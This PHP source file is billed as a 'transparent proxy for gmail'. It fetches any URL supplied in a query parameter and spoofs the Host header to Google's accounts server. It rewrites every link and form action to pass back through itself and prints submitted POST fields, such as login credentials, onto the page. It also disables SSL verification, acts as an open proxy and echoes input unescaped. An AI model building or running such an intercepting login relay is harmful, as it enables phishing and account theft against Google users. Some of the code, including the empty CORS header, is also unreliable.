<?php
/**
 * Transparent proxy for gmail.
 * url specific : localhost/proxy/index.php?url=https://accounts.google.com/ServiceLogin?nojavascript=1
 * using only curl.
 */

/**
 * Set PHP execution timeout to infinite.
 * Set error messages to true.
 */
set_time_limit(0);
error_reporting(E_ALL);

/**
 * set cross origin header
 */
header("Access-Control-Allow-Origin: ");

/**
 * script constants.
 */
define('HOST',$_SERVER['HTTP_HOST']);
define('FILE_PATH', $_SERVER['PHP_SELF']);

/**
 * check if curl installed.
 */
if (function_exists("curl_init")){
    echo "<pre>status: INIT</pre>";
    proxy();
} else {
    echo "<pre>status: CURL NOT INSTALLED</pre>";
}
echo "<pre>status: END</pre>";

function proxy(){
    if (isset($_GET['url'])){

        $url = $_GET['url'];
        $method = $_SERVER['REQUEST_METHOD'];

        //Initialize Curl resource.
        $ch = curl_init();

        //set url.
        curl_setopt($ch, CURLOPT_URL, $url);

        //set curl output to return in variable.
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        //set curl to follow redirects.
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

        //set ssl verifypeer false
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        //view header info in curlinfo
        curl_setopt($ch, CURLINFO_HEADER_OUT, true);

        //get response header in output body
        curl_setopt($ch, CURLOPT_HEADER, true);


        switch ($method){
            case "GET":
                $ch = getReq($ch);
                break;
            case "POST":
                printPostData();
                $ch = postReq($ch);
                break;
            default:
        }


        modifyHeaders($ch);
        //get curl output
        $output = curl_exec($ch);

        $output = replaceLinks($output);

        echo $output;

        //Close curl resource.
        curl_close($ch);
    } else {
        echo "<pre>No url given</pre>";
    }
}

function modifyHeaders($ch){
    $rh = getallheaders();
    foreach ($rh as $k => $v){
        if ( $k === "Host" ){
            $h = "$k:accounts.google.com";
        } else if ( $k === "Accept-Encoding" ){
            continue;
        } else {
            $h = "$k:$v";
        }
        $headers[] = $h;
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    return $ch;
}

function setHeaders($ch){

}

function getReq($ch){
    return $ch;
}

function postReq($ch){
    curl_setopt($ch, CURLOPT_POST, true );
    return $ch;
}

function replaceLinks($content){
    //replace href links.
    $hrefLinkR = '<a href="http://'.HOST.FILE_PATH.'?url=';
    $hrefLinkP = '/<a(.*?)href(.*?)="/';
    $content = preg_replace($hrefLinkP, $hrefLinkR, $content);

    //replace form links
    $formLinkR = 'action="http://'.HOST.FILE_PATH.'?url=';
    $formLinkP = '/action="/';
    $content = preg_replace($formLinkP, $formLinkR, $content);

    return $content;
}

function printPostData(){
    echo "<pre>";
    foreach ($_POST as $k => $v){
        echo "$k : $v <br/>";
    }
    echo "</pre>";
}

function printGetData(){
    echo "<pre>";
    foreach ($_GET as $k => $v){
        echo "$k : $v <br/>";
    }
    echo "</pre>";
}

function printRequestHeaders(){
    $a = getallheaders();
    echo "<pre>";
    foreach ($a as $k => $v){
        echo "$k : $v <br/>";
    }
    echo "</pre>";
}

function printResponsetHeaders(){
    $a = headers_list();
    echo "<pre>";
    foreach ($a as $k => $v){
        echo "$k : $v <br/>";
    }
    echo "</pre>";
}

function printCurlInfo($ch){
    $sentHeaders = curl_getinfo($ch);
    echo "<pre>";
    var_dump($sentHeaders);
    echo "</pre>";
}

?>
